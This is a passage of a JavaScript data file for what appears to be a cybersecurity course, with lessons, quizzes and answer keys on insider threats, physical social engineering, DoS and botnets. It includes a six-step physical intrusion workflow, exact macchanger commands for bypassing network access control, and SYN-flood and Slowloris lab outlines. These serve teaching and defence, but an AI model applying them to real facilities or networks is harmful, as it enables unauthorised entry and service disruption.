      fb: 'The Principle of Least Privilege ensures users only have the minimum access necessary to perform their jobs, limiting what an insider can steal or damage.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'A compromised insider is an employee who willingly sells their credentials to an external attacker.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. A compromised insider refers to an innocent employee whose account has been taken over by an external attacker (e.g., via phishing). An employee selling credentials is a malicious insider.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which technical indicator might suggest data exfiltration by an insider?',
      opts: ['A sudden spike in outbound network traffic to a personal cloud storage site', 'Frequent password resets', 'High CPU utilization on a domain controller', 'Multiple failed login attempts'],
      correct: 0,
      fb: 'Large outbound data transfers, especially to unauthorized external storage, strongly indicate potential data theft.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Why should HR and IT collaborate closely regarding insider threats?',
      opts: ['To ensure employees have fast computers', 'Because HR holds the encryption keys', 'To ensure immediate access revocation during terminations or hostile departures', 'To manage the corporate firewall'],
      correct: 2,
      fb: 'Promptly revoking access during offboarding is critical to preventing departing employees from becoming malicious insiders.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'In Linux, what service is commonly used to track detailed user access to specific files and directories?',
      opts: ['iptables', 'auditd', 'cron', 'systemd'],
      correct: 1,
      fb: 'The audit daemon (auditd) allows administrators to create rules that log detailed information about file access and command execution.'
    }
  ],
  flashcards: [
    { f: 'Malicious Insider', b: 'An individual who intentionally exploits their legitimate access to harm the organization.' },
    { f: 'Negligent Insider', b: 'An individual who accidentally exposes the organization to risk through carelessness.' },
    { f: 'Compromised Insider', b: 'An employee whose credentials have been stolen by an external attacker.' },
    { f: 'UEBA', b: 'User and Entity Behavior Analytics; uses machine learning to detect anomalous user activity.' },
    { f: 'Principle of Least Privilege', b: 'Granting users only the minimum access rights necessary to perform their jobs.' }
  ],
  summary: [
    'Insider threats fall into three categories: Malicious, Negligent, and Compromised.',
    'They are difficult to detect because the threat actor has legitimate access.',
    'Behavioral indicators include odd working hours, sudden financial changes, or expressing extreme grievances.',
    'Technical indicators include unusual data access, large outbound transfers, and privilege escalation.',
    'Mitigation relies on the Principle of Least Privilege, UEBA, and tight integration between HR and IT for offboarding.'
  ],
  outcomes: [
    'Differentiate between malicious, negligent, and compromised insiders.',
    'Recognize common behavioral and technical indicators of compromise.',
    'Understand how UEBA is used to establish baselines and detect anomalies.',
    'Configure basic audit logging in Linux to monitor sensitive files.'
  ],
  meta: {
    contentVersion: '1.0.0',
    estimatedTime: 45,
    difficulty: 'Intermediate',
    prerequisites: ['Understanding of access control models'],
    lastReviewed: '2026-07-18'
  }
};

CONTENT['impersonation'] = {
  eyebrow: 'Module 09 · Topic 4',
  title: 'Impersonation & Physical Social Engineering',
  module: 'Phase 09: Security Awareness Officer',
  sub: 'Mastering pretexting, tailgating, dumpster diving, and shoulder surfing.',
  objectives: ['Identify physical social engineering techniques', 'Understand the mechanics of pretexting and impersonation', 'Implement physical security controls against social engineering'],
  learn: {
    simple: 'Impersonation occurs when a social engineer pretends to be someone else to gain trust or access. This can happen over the phone, via email, or in person. Physical social engineering involves exploiting human behavior to bypass physical security barriers, such as doors and locked cabinets. Common techniques include following someone through a secure door (tailgating), looking over someone\'s shoulder to steal passwords (shoulder surfing), or searching through trash for sensitive documents (dumpster diving).',
    analogy: 'Tailgating is like holding the door open for someone carrying heavy boxes; your politeness overrides your security awareness. Dumpster diving is like trying to reconstruct a shredded puzzle to see the full picture of an organization\'s secrets.',
    architecture: 'Pretexting is the foundation of impersonation. It involves creating a highly detailed, fabricated scenario (the pretext) that justifies the attacker\'s presence or request. The attacker must adopt the persona completely, including terminology, authority level, and demeanor.\n\nPhysical exploitation leverages natural human politeness. Tailgating (or piggybacking) involves an attacker closely following an authorized employee into a restricted area. The difference is that in piggybacking, the employee knows the person is following and allows it (often out of politeness), whereas in tailgating, the employee may be unaware.\n\nDumpster diving exploits the failure to properly destroy sensitive information. Attackers look for organizational charts, memos, passwords written on sticky notes, and hardware like old hard drives. Shoulder surfing requires direct observation, often aided by binoculars or hidden cameras, to capture credentials entered on keyboards or keypads.',
    why: 'An enterprise can have perfect digital security, but if an attacker can physically walk into the server room by wearing a fake maintenance uniform and holding a clipboard, all digital defenses are bypassed. Physical security is the foundation of all cybersecurity.'
  },
  enterprise: {
    gfs: 'An attacker wearing an internet service provider uniform arrives at a Global Financial Services branch office, claiming they need to check the main distribution frame. Due to a busy schedule, the receptionist allows them into the server room without verifying their work order.',
    windows: 'To combat shoulder surfing in Windows environments, GFS enforces screen timeouts and requires employees to lock their workstations (Win+L) immediately when stepping away from their desks.',
    linux: 'Physical access to a Linux terminal can allow an attacker to reboot the system into single-user mode, granting root access without a password, highlighting the critical need to secure physical hardware.'
  },
  workflow: [
    'Step 1: Reconnaissance - Observe physical security controls (cameras, guards, badge readers).',
    'Step 2: Pretext Development - Create a believable persona (e.g., delivery driver, IT auditor).',
    'Step 3: Props and Costuming - Acquire necessary uniforms, fake badges, or clipboards.',
    'Step 4: Execution (Tailgating/Impersonation) - Approach the target facility and bypass the perimeter.',
    'Step 5: Objective Achievement - Plant a rogue device, steal documents, or access an unlocked terminal.',
    'Step 6: Egress - Leave the facility confidently without drawing attention.'
  ],
  diagram: {
    caption: 'Click to interact with Physical Social Engineering Threats',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect width="100%" height="100%" fill="#1e1e1e"/><text x="300" y="50" fill="#fff" font-size="20" text-anchor="middle">Physical Security Exploits</text><rect x="50" y="100" width="150" height="80" rx="10" fill="#007acc"/><text x="125" y="135" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Tailgating</text><text x="125" y="155" fill="#fff" font-size="12" text-anchor="middle">Following authorized personnel</text><rect x="225" y="100" width="150" height="80" rx="10" fill="#007acc"/><text x="300" y="135" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Dumpster Diving</text><text x="300" y="155" fill="#fff" font-size="12" text-anchor="middle">Scavenging trashed data</text><rect x="400" y="100" width="150" height="80" rx="10" fill="#007acc"/><text x="475" y="135" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Shoulder Surfing</text><text x="475" y="155" fill="#fff" font-size="12" text-anchor="middle">Direct observation</text><rect x="225" y="250" width="150" height="80" rx="10" fill="#d9534f"/><text x="300" y="285" fill="#fff" font-size="14" font-weight="bold" text-anchor="middle">Impersonation</text><text x="300" y="305" fill="#fff" font-size="12" text-anchor="middle">Using a Pretext (Uniform/Badge)</text><path d="M 300 250 L 300 180" stroke="#fff" stroke-width="2" marker-end="url(#arrow)"/></svg>'
  },
  commands: {
    lin: [
      { cmd: 'macchanger', purpose: 'Spoof MAC address', out: 'New MAC assigned', note: 'Useful if attempting to bypass physical network port security (NAC) after gaining entry', mistake: 'Spoofing a MAC address that is currently active on the network' }
    ],
    win: [
      { cmd: 'rundll32.exe user32.dll,LockWorkStation', purpose: 'Lock the Windows session', out: 'Session locked', note: 'Essential command to mitigate physical access threats when leaving a desk', mistake: 'Relying solely on a long timeout period instead of manual locking' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['macchanger'],
    dependencies: [],
    safety: ['Only alter MAC addresses on networks you have permission to test.'],
    scenario: 'During a physical penetration test at GFS, you have successfully tailgated into an office area. You find an open ethernet port, but Network Access Control (NAC) restricts access to known MAC addresses. You must spoof a known printer\'s MAC address to gain network access.',
    objectives: ['Identify your current MAC address', 'Use macchanger to spoof a specific MAC address'],
    steps: [
      'Step 1: Open terminal in Kali Linux.',
      'Step 2: Check current MAC address: `ip link show eth0`.',
      'Step 3: Bring the interface down: `sudo ip link set eth0 down`.',
      'Step 4: Spoof the MAC address of the target printer (e.g., 00:11:22:33:44:55): `sudo macchanger -m 00:11:22:33:44:55 eth0`.',
      'Step 5: Bring the interface up: `sudo ip link set eth0 up`.',
      'Step 6: Verify the change: `ip link show eth0`.'
    ],
    evidence: ['Terminal output showing the original MAC and the new spoofed MAC.'],
    validation: ['You should see: "New MAC: 00:11:22:33:44:55" in the macchanger output.'],
    troubleshooting: ['If the interface fails to come up, restart NetworkManager (`sudo systemctl restart NetworkManager`).'],
    mitre: [{ id: 'T1562.001', name: 'Disable or Modify Tools', tactic: 'Defense Evasion' }],
    cleanup: ['Restore original MAC: `sudo macchanger -p eth0` and bring interface up.']
  },
  quiz: [
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker wearing a delivery uniform closely follows an employee through a secure badge-access door without swiping their own badge. What is this technique called?',
      opts: ['Dumpster Diving', 'Tailgating', 'Shoulder Surfing', 'Phishing'],
      correct: 1,
      fb: 'Tailgating (or piggybacking) involves following an authorized person into a restricted area to bypass physical security controls.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which physical security control is specifically designed to prevent tailgating?',
      opts: ['CCTV Cameras', 'Mantrap', 'Shredders', 'Biometric Scanners'],
      correct: 1,
      fb: 'A mantrap is a small space with two sets of interlocking doors, designed so that only one person can pass through at a time, preventing tailgating.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What is the primary objective of dumpster diving in social engineering?',
      opts: ['To install malware on discarded hard drives', 'To recover sensitive information such as organizational charts, passwords, or memos', 'To physically destroy the company\'s trash compactors', 'To bypass firewall rules'],
      correct: 1,
      fb: 'Dumpster diving is a reconnaissance technique used to gather discarded but sensitive information that can aid in further attacks.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Shoulder surfing only occurs in physical proximity and cannot be done remotely.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. Shoulder surfing can be done from a distance using binoculars, high-resolution cameras, or CCTV feeds.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'What is a "pretext" in the context of impersonation?',
      opts: ['The malicious payload delivered via USB', 'A fabricated scenario or persona created to gain trust and extract information', 'The physical badge used to clone access', 'The process of locking a workstation'],
      correct: 1,
      fb: 'Pretexting is the act of creating an invented scenario to engage a targeted victim in a manner that increases the chance they will divulge information.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'How can an organization best defend against dumpster diving?',
      opts: ['Installing mantraps', 'Enforcing screen locks', 'Implementing a strict shredding policy for all printed documents', 'Using MAC address filtering'],
      correct: 2,
      fb: 'A strict shredding policy (using cross-cut shredders) ensures that sensitive documents cannot be reconstructed if retrieved from the trash.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'An attacker looks over an employee\'s shoulder while they type their password at a coffee shop. What is this called?',
      opts: ['Elicitation', 'Tailgating', 'Shoulder Surfing', 'Pretexting'],
      correct: 2,
      fb: 'Shoulder surfing is the direct observation of a target entering sensitive information.'
    },
    {
      type: 'true-false',
      difficulty: 'Intermediate',
      q: 'Impersonation attacks only happen in person.',
      opts: ['True', 'False'],
      correct: 1,
      fb: 'False. Impersonation can occur via email (CEO fraud), over the phone (vishing), or in person.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Why might an attacker use the `macchanger` tool after gaining physical access to an office?',
      opts: ['To decrypt a hard drive', 'To bypass Network Access Control (NAC) by spoofing an authorized device\'s MAC address', 'To launch a phishing campaign', 'To lock the user\'s screen'],
      correct: 1,
      fb: 'If a network restricts access based on MAC addresses, an attacker can spoof the MAC of an authorized device (like a printer) to gain connectivity.'
    },
    {
      type: 'multiple-choice',
      difficulty: 'Intermediate',
      q: 'Which of the following is the best defense against tailgating if physical modifications like mantraps are not possible?',
      opts: ['Installing heavier doors', 'Creating a culture where employees are trained and empowered to challenge unbadged individuals', 'Placing security cameras in the break room', 'Requiring complex passwords'],
      correct: 1,
      fb: 'Empowering employees to challenge strangers is the most effective administrative control against tailgating.'
    }
  ],
  flashcards: [
    { f: 'Tailgating', b: 'Following an authorized person into a secure area without authorization.' },
    { f: 'Mantrap', b: 'A physical security control consisting of two interlocking doors to prevent tailgating.' },
    { f: 'Dumpster Diving', b: 'Searching through trash to find sensitive organizational information.' },
    { f: 'Shoulder Surfing', b: 'Directly observing someone entering sensitive information, such as passwords or PINs.' },
    { f: 'MAC Spoofing', b: 'Changing a device\'s Media Access Control address to bypass network access controls.' }
  ],
  summary: [
    'Physical social engineering bypasses digital controls by exploiting human nature and physical vulnerabilities.',
    'Pretexting involves creating a detailed, believable persona to gain trust and access.',
    'Tailgating is a common method for entering secure facilities without a badge.',
    'Dumpster diving yields valuable OSINT if proper document destruction policies are not followed.',
    'Defenses include mantraps, strict shredding policies, privacy screens, and employee empowerment to challenge strangers.'
  ],
  outcomes: [
    'Describe the mechanisms of physical social engineering attacks like tailgating and dumpster diving.',
    'Explain the role of pretexting in successful impersonation.',
    'Identify appropriate physical and administrative controls to mitigate physical security threats.',
    'Demonstrate the ability to bypass basic MAC filtering using macchanger.'
  ],
  meta: {
    contentVersion: '1.0.0',
    estimatedTime: 45,
    difficulty: 'Intermediate',
    prerequisites: ['Understanding of physical security principles'],
    lastReviewed: '2026-07-18'
  }
};


CONTENT['dos-concepts'] = {
  eyebrow: 'Module 10 · Topic 1',
  title: 'DoS and DDoS Concepts',
  module: 'Phase 10: Network Defense Analyst',
  sub: 'Understanding the fundamentals of Denial of Service and Distributed Denial of Service attacks.',
  objectives: ['Understand Volumetric attacks', 'Identify Protocol attacks', 'Recognize Application-layer attacks'],
  learn: {
    simple: 'A Denial of Service (DoS) attack is a malicious attempt to disrupt the normal traffic of a targeted server, service, or network by overwhelming the target or its surrounding infrastructure with a flood of Internet traffic. A Distributed Denial of Service (DDoS) attack involves multiple compromised computer systems as sources of attack traffic. These sources can include computers and other networked resources such as IoT devices.',
    analogy: 'Imagine a store with a single entrance. If a large crowd of people gathers at the entrance and refuses to move, legitimate customers cannot enter the store. A DoS attack works similarly by clogging the entry points to a digital service.',
    architecture: 'At a technical level, DoS/DDoS attacks are categorized into three main types: Volumetric (e.g., UDP floods, ICMP floods) which consume bandwidth; Protocol (e.g., SYN floods, Ping of Death) which consume server resources like firewalls or load balancers; and Application-layer (e.g., HTTP GET/POST floods) which crash web servers by making seemingly legitimate but resource-intensive requests.',
    why: 'In enterprise cybersecurity, DDoS attacks can lead to significant downtime, loss of revenue, and reputational damage. Understanding these concepts is critical for designing resilient architectures capable of absorbing or mitigating such attacks.'
  },
  enterprise: {
    gfs: 'Global Financial Services (GFS) experienced a multi-vector DDoS attack during a major trading period, highlighting the need for robust volumetric and application-layer defense mechanisms.',
    windows: 'Windows servers can be targeted with protocol attacks; monitoring performance counters and event logs helps in early detection of resource exhaustion.',
    linux: 'Linux environments often serve as edge firewalls or reverse proxies and can be configured with iptables rate limiting to thwart basic DoS attempts.'
  },
  workflow: ['Step 1: Monitor network baseline traffic.', 'Step 2: Identify traffic anomalies or sudden spikes.', 'Step 3: Analyze traffic sources to distinguish legitimate users from attackers.', 'Step 4: Determine the attack vector (volumetric, protocol, or application).', 'Step 5: Activate mitigation protocols.', 'Step 6: Conduct post-incident analysis.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="400" height="200" fill="#e2e8f0"/><text x="300" y="200" dominant-baseline="middle" text-anchor="middle" font-size="24">DoS/DDoS Attack Vectors</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'tcpdump -i eth0 -n "tcp[tcpflags] & (tcp-syn) != 0"', purpose: 'Capture SYN packets', out: 'List of SYN packets', note: 'Useful for detecting SYN floods', mistake: 'Running without filters capturing too much data' }
    ],
    win: [
      { cmd: 'Get-NetTCPConnection -State SynReceived', purpose: 'Check half-open connections', out: 'List of connections', note: 'High count indicates SYN flood', mistake: 'Running on non-server systems unnecessarily' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['hping3', 'Wireshark'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS network operations wants to simulate a SYN flood attack to test detection mechanisms.',
    objectives: ['Simulate a SYN flood', 'Detect the flood using network monitoring tools'],
    steps: ['Step 1: Open terminal in Kali Linux.', 'Step 2: Run hping3 to start the flood.', 'Step 3: Open Wireshark on the target machine.', 'Step 4: Filter for SYN packets without ACKs.'],
    evidence: ['Terminal output from hping3', 'Wireshark packet capture showing SYN flood'],
    validation: ['You should see a massive amount of SYN packets arriving at the target in Wireshark.'],
    troubleshooting: ['If hping3 fails, ensure you are running it as root (sudo hping3).'],
    mitre: [{ id: 'T1498', name: 'Network Denial of Service', tactic: 'Impact' }],
    cleanup: ['Stop hping3 by pressing Ctrl+C.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is the primary goal of a DoS attack?', opts: ['To steal data', 'To disrupt service', 'To install malware', 'To gain unauthorized access'], correct: 1, fb: 'The goal is to disrupt service by overwhelming resources.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'A DDoS attack uses multiple systems to attack a single target.', opts: ['True', 'False'], correct: 0, fb: 'DDoS stands for Distributed DoS, utilizing multiple compromised hosts.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which attack type focuses on consuming network bandwidth?', opts: ['Application-layer', 'Protocol', 'Volumetric', 'Physical'], correct: 2, fb: 'Volumetric attacks aim to saturate the bandwidth of the targeted site.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which of the following is a Protocol attack?', opts: ['HTTP GET Flood', 'SYN Flood', 'DNS Amplification', 'Slowloris'], correct: 1, fb: 'SYN Flood attacks the TCP protocol handshake mechanism.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'Application-layer attacks are easier to detect than volumetric attacks.', opts: ['True', 'False'], correct: 1, fb: 'False. Application-layer attacks mimic legitimate traffic and require fewer resources, making them harder to detect.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'How does an amplification attack work?', opts: ['By spoofing the target IP', 'By exploiting vulnerabilities in web apps', 'By sending large requests that trigger even larger responses', 'By cracking passwords'], correct: 2, fb: 'Amplification relies on protocols that send large responses to small queries.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which OSI layer does a volumetric attack primarily target?', opts: ['Layer 7', 'Layer 3 and 4', 'Layer 2', 'Layer 1'], correct: 1, fb: 'Volumetric attacks often operate at the network and transport layers.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'DoS attacks can be launched accidentally by legitimate users.', opts: ['True', 'False'], correct: 0, fb: 'True. A sudden massive surge in legitimate traffic (the "Slashdot effect") can cause an unintentional DoS.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What resource does a Ping of Death attack target?', opts: ['Memory buffers', 'Bandwidth', 'CPU cycles', 'Disk space'], correct: 0, fb: 'Ping of Death sends oversized ICMP packets that can overflow memory buffers.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which attack vector targets the state tables of firewalls?', opts: ['ICMP Flood', 'SYN Flood', 'UDP Flood', 'HTTP POST Flood'], correct: 1, fb: 'SYN Floods consume state table entries in stateful firewalls.' }
  ],
  flashcards: [
    { f: 'DoS', b: 'Denial of Service; an attack meant to shut down a machine or network.' },
    { f: 'DDoS', b: 'Distributed Denial of Service; a DoS attack originating from multiple sources.' }
  ],
  summary: ['DoS disrupts services by overwhelming resources.', 'DDoS uses multiple compromised systems.', 'Volumetric attacks consume bandwidth.', 'Protocol attacks consume server resources.', 'Application-layer attacks target web applications.'],
  outcomes: ['Differentiate between DoS and DDoS.', 'Identify the three main categories of DoS attacks.', 'Understand the business impact of service disruption.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Intermediate", prerequisites: ["Network Basics"], lastReviewed: "2026-07-18" }
};

CONTENT['botnets'] = {
  eyebrow: 'Module 10 · Topic 2',
  title: 'Botnets & IoT Exploitation',
  module: 'Phase 10: Network Defense Analyst',
  sub: 'Understanding Command and Control (C2) architecture and the role of botnets in modern DDoS attacks.',
  objectives: ['Analyze C2 architecture', 'Examine the Mirai botnet', 'Understand IoT exploitation techniques'],
  learn: {
    simple: 'A botnet is a network of compromised computers or devices (bots) controlled by a central attacker, known as a botmaster. These networks are often used to launch massive DDoS attacks. With the proliferation of Internet of Things (IoT) devices, attackers have found a vast pool of vulnerable devices to recruit into botnets.',
    analogy: 'Think of a botnet like a zombie army. The attacker is the necromancer controlling the zombies. Individually, a zombie might not be very strong, but a massive horde coordinated by the necromancer can overrun any defense.',
    architecture: 'Botnets rely on a Command and Control (C2) infrastructure. Earlier botnets used centralized IRC servers, but modern botnets often use decentralized Peer-to-Peer (P2P) architectures or Domain Generation Algorithms (DGA) to evade takedowns. The Mirai botnet, infamous for massive DDoS attacks, specifically targeted vulnerable IoT devices using default credentials, turning IP cameras and home routers into attack nodes.',
    why: 'IoT botnets represent a significant threat to enterprises because the attack volume they can generate is unprecedented. Organizations must understand botnet mechanisms to filter traffic and cooperate with ISPs for upstream mitigation.'
  },
  enterprise: {
    gfs: 'GFS threat intelligence identified a large portion of inbound attack traffic originating from consumer IoT devices, prompting a shift in edge defense strategies.',
    windows: 'Windows machines can be infected by malware to become part of a botnet; Endpoint Detection and Response (EDR) solutions monitor for C2 beacons.',
    linux: 'Linux-based IoT devices are prime targets for botnets like Mirai; securing SSH/Telnet and updating firmware is crucial.'
  },
  workflow: ['Step 1: Monitor outbound traffic for C2 communication patterns.', 'Step 2: Identify compromised endpoints within the network.', 'Step 3: Isolate infected devices.', 'Step 4: Analyze malware payload to understand the botnet family.', 'Step 5: Clean the infected devices.', 'Step 6: Update network perimeter defenses.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><circle cx="300" cy="200" r="100" fill="#fca5a5"/><text x="300" y="200" dominant-baseline="middle" text-anchor="middle" font-size="20">Botnet C2 Architecture</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'netstat -tulnp | grep -i listen', purpose: 'Check listening ports', out: 'List of listening services', note: 'Helps identify backdoors left by botnet malware', mistake: 'Ignoring non-standard ports' }
    ],
    win: [
      { cmd: 'Get-Process | Where-Object {$_.Path -match "Temp"}', purpose: 'Find suspicious processes running from Temp', out: 'List of processes', note: 'Malware often executes from temporary directories', mistake: 'Terminating critical system processes by mistake' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Wireshark', 'Snort'],
    dependencies: [],
    safety: ['Perform this lab only in an isolated environment.'],
    scenario: 'GFS SOC analysts need to identify C2 beaconing activity from a suspected compromised host.',
    objectives: ['Analyze network traffic for C2 beacons', 'Write an IDS rule to detect the activity'],
    steps: ['Step 1: Open the provided PCAP file in Wireshark.', 'Step 2: Look for regular, small DNS requests to unusual domains.', 'Step 3: Note the domain and frequency.', 'Step 4: Write a Snort rule to alert on this specific DNS query.'],
    evidence: ['Wireshark screenshots of beaconing', 'Custom Snort rule text'],
    validation: ['You should find a DNS query occurring exactly every 60 seconds to a randomly generated domain name.'],
    troubleshooting: ['If you cannot spot the beacon, filter by "dns" and sort by time.'],
    mitre: [{ id: 'T1071', name: 'Application Layer Protocol', tactic: 'Command and Control' }],
    cleanup: ['Close Wireshark and delete the PCAP.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is a botnet?', opts: ['A network of compromised devices', 'A type of firewall', 'A legitimate internet scanning tool', 'An antivirus software'], correct: 0, fb: 'A botnet is a network of compromised devices controlled by an attacker.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'IoT devices are frequently targeted by botnets because they often have weak or default passwords.', opts: ['True', 'False'], correct: 0, fb: 'True. Default credentials are a primary infection vector for IoT botnets like Mirai.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does C2 stand for in the context of botnets?', opts: ['Command and Control', 'Central Communication', 'Computer Coordination', 'Cyber Connection'], correct: 0, fb: 'C2 refers to Command and Control infrastructure.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which botnet is famous for turning IoT devices into DDoS attack nodes?', opts: ['Zeus', 'Conficker', 'Mirai', 'Stuxnet'], correct: 2, fb: 'Mirai exploited default telnet credentials on IoT devices.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'Botnets can only be used for DDoS attacks.', opts: ['True', 'False'], correct: 1, fb: 'False. Botnets are also used for spamming, credential stuffing, and cryptomining.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What is a Domain Generation Algorithm (DGA) used for in botnets?', opts: ['To speed up network scanning', 'To generate passwords for brute forcing', 'To create multiple dynamic domains for C2 communication', 'To encrypt malware payloads'], correct: 2, fb: 'DGAs help botnets evade takedowns by constantly changing the C2 domain.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a common protocol used by early botnets for C2 communication?', opts: ['HTTP', 'IRC', 'DNS', 'SSH'], correct: 1, fb: 'Internet Relay Chat (IRC) was widely used for early centralized botnet C2.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'Peer-to-Peer (P2P) botnets are easier to take down than centralized IRC botnets.', opts: ['True', 'False'], correct: 1, fb: 'False. P2P botnets lack a single point of failure, making them much harder to dismantle.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How does malware typically recruit an IoT device into a botnet?', opts: ['By sending a phishing email', 'By exploiting unpatched vulnerabilities or weak credentials over the network', 'By physical access', 'Through social engineering of the device owner'], correct: 1, fb: 'IoT malware scans the internet for exposed services with vulnerabilities or default credentials.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which of the following is NOT a common use of a botnet?', opts: ['DDoS attacks', 'Spam distribution', 'Hardware upgrading', 'Cryptomining'], correct: 2, fb: 'Botnets perform malicious actions; hardware upgrading is not one of them.' }
  ],
  flashcards: [
    { f: 'C2', b: 'Command and Control infrastructure used by botmasters.' },
    { f: 'Mirai', b: 'A notorious malware that turns networked devices running Linux into remotely controlled bots.' }
  ],
  summary: ['Botnets are networks of compromised devices.', 'IoT devices are prime targets due to poor security.', 'C2 infrastructure is essential for botnet coordination.', 'Mirai popularized large-scale IoT botnets.', 'DGAs and P2P architectures make botnets resilient.'],
  outcomes: ['Explain how a botnet operates.', 'Identify the risks associated with IoT devices.', 'Describe C2 mechanisms.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 50, difficulty: "Intermediate", prerequisites: ["DoS Concepts"], lastReviewed: "2026-07-18" }
};

CONTENT['dos-attack-techniques'] = {
  eyebrow: 'Module 10 · Topic 3',
  title: 'DoS/DDoS Attack Techniques',
  module: 'Phase 10: Network Defense Analyst',
  sub: 'Deep dive into specific attack vectors including SYN floods, UDP floods, Slowloris, and HTTP POST attacks.',
  objectives: ['Understand SYN and UDP floods', 'Analyze the Slowloris attack', 'Identify HTTP POST attacks'],
  learn: {
    simple: 'Attackers use various techniques to disrupt services. Some aim to overwhelm network pipes with massive amounts of data (UDP floods), while others target specific protocols to tie up server resources (SYN floods). More sophisticated attacks target the application layer (Slowloris, HTTP POST), achieving a DoS condition with surprisingly little bandwidth.',
    analogy: 'A UDP flood is like sending thousands of junk mail letters to a post office, overwhelming the sorters. Slowloris is like a customer at a checkout counter who takes five minutes to find each penny to pay their bill, holding up the entire line indefinitely.',
    architecture: 'A SYN flood exploits the TCP 3-way handshake by sending SYN requests but never sending the final ACK, leaving the server waiting with half-open connections. Slowloris is a Layer 7 attack that opens multiple connections to a web server and keeps them open as long as possible by sending partial HTTP requests. This exhausts the web server’s concurrent connection pool.',
    why: 'Defenders must understand these specific techniques because the mitigation strategies vary wildly. You cannot mitigate a Slowloris attack with the same volumetric defenses used against a UDP flood.'
  },
  enterprise: {
    gfs: 'GFS web applications were targeted by a Slowloris attack, which bypassed volumetric DDoS protections and exhausted the web server connection pools.',
    windows: 'IIS servers can be protected from Slowloris-style attacks by adjusting connection timeout limits and using reverse proxies.',
    linux: 'Apache web servers on Linux are notoriously vulnerable to Slowloris, whereas event-driven servers like Nginx handle such slow connections more efficiently.'
  },
  workflow: ['Step 1: Analyze server connection states (e.g., too many SYN_RECV or ESTABLISHED).', 'Step 2: Inspect packet payloads for malformed or unusually slow requests.', 'Step 3: Identify the specific technique being used.', 'Step 4: Apply protocol-specific mitigations (e.g., SYN cookies).', 'Step 5: Adjust server timeout settings.', 'Step 6: Monitor for technique shifting by the attacker.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="400" height="200" fill="#fde047"/><text x="300" y="200" dominant-baseline="middle" text-anchor="middle" font-size="24">Attack Techniques</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'netstat -ntu | awk \'{print $5}\' | cut -d: -f1 | sort | uniq -c | sort -n', purpose: 'Count connections per IP', out: 'List of IPs and connection counts', note: 'Useful for spotting IP addresses opening too many connections', mistake: 'Not running as root' }
    ],
    win: [
      { cmd: 'Get-NetTCPConnection | Group-Object RemoteAddress | Sort-Object Count -Descending', purpose: 'Identify IPs with most connections', out: 'Grouped connection counts', note: 'Identifies potential sources of connection-exhaustion attacks', mistake: 'Ignoring IPv6 connections' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '60',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Slowloris', 'Apache'],
    dependencies: ['python3-slowloris'],
    safety: ['Perform this lab only in an isolated environment against your own VMs.'],
